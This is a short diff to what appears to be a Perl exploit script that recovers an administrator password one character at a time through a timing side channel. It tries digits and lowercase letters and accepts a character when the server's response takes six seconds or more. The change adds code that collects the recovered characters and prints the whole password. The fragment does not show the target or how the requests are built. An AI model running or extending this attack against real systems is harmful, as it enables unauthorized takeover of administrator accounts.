@@ -63,7 +63,7 @@ say "The length of the password is: $pass_len";
 
 my @chars = ( 0 .. 9, 'a' .. 'z');
 my ($password,$c);
-say "Guessing the administrator password...";
+say "Guessing the administrator password, this may take a while...";
 for my $i (1 .. 20) {
     while ($response->is_success and @chars) {
 	$c =  shift @chars;
@@ -73,6 +73,8 @@ for my $i (1 .. 20) {
 	last if (tv_interval($t0) >= 6 and  $response->is_success);
 	
     }
+    $password .= $c;
     say $c;
     @chars = ( 0 .. 9, 'a' .. 'z');
 }
+say "administrator password: $password";
